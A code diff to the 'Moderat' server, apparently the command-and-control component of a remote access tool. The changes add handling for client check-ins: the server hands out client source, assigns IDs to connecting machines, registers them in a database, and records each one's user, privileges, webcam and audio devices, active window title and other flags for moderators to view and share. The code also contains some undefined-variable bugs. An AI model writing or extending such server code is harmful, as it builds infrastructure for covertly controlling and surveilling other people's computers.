@@ -8,7 +8,7 @@ from twisted.internet import task
 from twisted.protocols.basic import LineReceiver
 
 from mdb import MDB
-from commands import client
+from libs import id
 
 
 class ModeratServerProtocol(LineReceiver):
@@ -53,7 +53,7 @@ class ModeratServerProtocol(LineReceiver):
             pass
 
     def lineLengthExceeded(self, line):
-        self.factory.log.warning('[SERVER] Data Length Exceeded from {}'.format(self.transport.getPeer().host))
+        self.factory.log.warning('[SERVER] Data Length Exceeded from {}'.format(ipAddress))
 
     def lineReceived(self, line):
         try:
@@ -67,17 +67,54 @@ class ModeratServerProtocol(LineReceiver):
         self.moduleID = command['module_id']
 
         if command['from'] == 'client':
-            # TODO: CLient Commands
-            pass
+            self.clientCommands()
         elif command['from'] == 'moderator':
-            if not command['mode'] == 'getModerators' and not command['mode'] == 'getClients':
-                self.factory.log.info('[*RECV] [Moderator: %s] [Mode: (%s)]' % (self.transport.getPeer().host, command['mode']))
             self.moderatorCommands()
 
-    # Moderator Commands
+    def clientCommands(self):
+        ipAddress = self.transport.getPeer().host
+        if self.mode == 'buildClient':
+            from Client.Client import Source
+            self.sendLine(Source)
+            del Source
+
+        elif self.mode == 'buildClientError':
+            self.factory.log.warning('[ERROR*] [IP: {0}] [ERRMSG: {1}'.format(ipAddress, self.payload))
+
+        elif self.mode == 'clientInitializing':
+            if self.payload == 'noKey':
+                client_id = id.generator()
+                self.factory.log.debug('[*CLIENT] Generate New Key (%s)' % client_id)
+                self.sendMessage(self, client_id)
+            else:
+                client_id = self.payload
+            self.factory.clients[client_id] = {
+                'protocol': self,
+                'status': False,
+            }
+            self.factory.log.debug('[*CLIENT] New Client from %s' % self.transport.getPeer())
+            self.factory.database.createClient('admin', client_id, ipAddress)
+            self.factory.database.setClientStatus(client_id, True)
+
+        elif self.mode == 'infoChecker':
+            protocol = self.factory.clients[self.payload['key']]['protocol']
+            self.factory.clients[self.payload['key']] = {
+                'ip_address': ipAddress, 'os_type': self.payload['os_type'], 'os': self.payload['os'],
+                'user': self.payload['user'], 'privileges': self.payload['privileges'],
+                'audio_device': self.payload['audio_device'], 'webcamera_device': self.payload['webcamera_device'],
+                'window_title': self.payload['window_title'], 'key': self.payload['key'],
+                'kts': self.payload['kts'], 'kt': self.payload['kt'], 'ats': self.payload['ats'], 'at': self.payload['at'],
+                'sts': self.payload['sts'], 'std': self.payload['std'], 'st': self.payload['st'], 'usp': self.payload['usp'],
+                'protocol': protocol, 'status': True,
+            }
+
+        else:
+            self.factory.log.warning('[MALFORMED] Bad Mode [{}] From [{}]'.format(self.mode, self.transport.getPeer()))
+
     def moderatorCommands(self):
+        ipAddress = self.transport.getPeer().host
         if self.mode == 'moderatorInitializing':
-            self.factory.log.debug('[MODERATOR] Initializing Moderator [FROM: %s]' % self.transport.getPeer().host)
+            self.factory.log.debug('[MODERATOR] Initializing Moderator [FROM: %s]' % ipAddress)
             if self.payload.startswith('auth '):
                 credentials = self.payload.split()
                 if len(credentials) == 3:
@@ -116,7 +153,7 @@ class ModeratServerProtocol(LineReceiver):
                     alias_client = alias_data[0]
                     alias_value = u' '.join(alias_data[1:])
                     self.factory.log.debug('[MODERATOR][{0}] Add Alias ({1}) for ({2})'.format(moderator.username, alias_value,
-                                                                                   self.transport.getPeer().host))
+                                                                                   ipAddress))
                     self.factory.database.set_alias(alias_client, alias_value)
                 except:
                     self.factory.log.critical('[MALFORMED][{0}] [MODE: {1}]'.format(moderator.username, mode))
@@ -337,19 +374,15 @@ class ModeratServerFactory(ServerFactory):
             moderator = self.database.getModerator(self.moderators[session]['username'])
             clients = self.database.getClients(moderator)
             for client in clients:
-                if current_clients.has_key(client.identifier) and client.status:
+                if current_clients.has_key(client.identifier) and current_clients[client.identifier]['status']:
                     _ = current_clients[client.identifier]
                     shared_clients[client.identifier] = {
-                        {
-                            'moderator': self.database.getClientModerator(client.identifier).username,
-                            'alias': self.database.getClientAlias(client.identifier),
-                            'ip_address': _['ip_address'], 'os_type': _['os_type'], 'os': _['os'],
+                            'moderator': self.database.getClientModerator(client.identifier),
+                            'alias': client.alias, 'ip_address': client.ip_address, 'os': _['os'],
                             'user': _['user'], 'privileges': _['privileges'], 'audio_device': _['audio_device'],
                             'webcamera_device': _['webcamera_device'], 'window_title': _['window_title'],
                             'key': _['key'], 'kts': _['kts'], 'kt': _['kt'], 'ats': _['ats'], 'at': _['at'],
-                            'sts': _['sts'], 'std': _['std'], 'st': _['st'], 'usp': _['usp'],
-                            'status': client.status
-                        }
+                            'sts': _['sts'], 'std': _['std'], 'st': _['st'], 'usp': _['usp'], 'status': _['status']
                     }
                 else:
                     shared_clients[client.identifier] = {
@@ -357,7 +390,7 @@ class ModeratServerFactory(ServerFactory):
                         'key': client.identifier,
                         'alias': client.alias,
                         'ip_address': client.ip_address,
-                        'last_online': client.last_connected.strftime("%Y-%m-%d %H:%M:%S"),
+                        'last_online': client.last_online.strftime("%Y-%m-%d %H:%M:%S"),
                         'status': client.status
                     }
             self.sendMessage(self.moderators[session]['protocol'], shared_clients, 'getClients', '', '')
